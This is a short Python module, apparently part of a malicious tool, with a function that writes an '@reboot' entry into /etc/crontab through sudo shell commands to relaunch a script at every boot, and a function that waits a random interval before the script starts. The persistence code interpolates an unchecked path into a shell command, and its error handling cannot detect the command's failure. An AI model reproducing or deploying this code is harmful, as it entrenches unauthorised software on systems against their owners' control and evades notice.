import os
import random
import time
from utils.logging import log_debug, log_info, log_error

def setup_persistence(script_path):
    log_debug(f"Setting up persistence for {script_path}")
    try:
        os.system(f"echo '@reboot /usr/bin/python3 {script_path} &' | sudo tee -a /etc/crontab")
        os.system(f"sudo chmod +x {script_path}")
        log_info(f"Persistence set up successfully for {script_path}")
    except Exception as e:
        log_error(f"Failed to set up persistence: {e}")

def random_start_delay(min_seconds=60, max_seconds=3600):
    delay = random.randint(min_seconds, max_seconds)
    log_debug(f"Introducing a random start delay of {delay} seconds")
    time.sleep(delay)
    log_info("Delay completed")
